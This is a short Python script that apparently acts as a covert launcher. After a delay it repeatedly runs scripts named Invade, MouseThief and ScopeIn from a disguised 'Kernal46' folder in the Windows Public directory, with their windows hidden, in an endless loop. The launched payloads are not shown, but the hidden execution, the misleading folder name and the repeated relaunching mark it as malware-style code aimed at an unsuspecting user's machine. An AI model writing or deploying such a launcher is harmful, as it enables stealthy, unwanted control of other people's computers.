import os
from time import sleep
import random
import subprocess
import psutil

path = "C:/users/" + os.getlogin() + "/AppData/Local/Programs/Python/Python312/python.exe "

invade = path + 'C:/Users/Public/Kernal46/PythonBased/Invade.py'
print('invade is now', invade)
mouseThief = path + 'C:/Users/Public/Kernal46/PythonBased/MouseThief.py'
scopeIn = path + 'C:/Users/Public/Kernal46/PythonBased/ScopeIn.py'
print(invade)

CREATE_NO_WINDOW = 0x08000000

sleep(50)
while True:
    r = (int)(random.random() * 3)
    r = 0
    if (r == 0):
        print('invade')
        subprocess.call(invade, creationflags = CREATE_NO_WINDOW)
    if (r == 1):
        print('mouseThief')
        subprocess.call(mouseThief, creationflags = CREATE_NO_WINDOW)
    if (r == 2):
        print('scopeIn')
        subprocess.call(scopeIn, creationflags = CREATE_NO_WINDOW)
    sleep(50)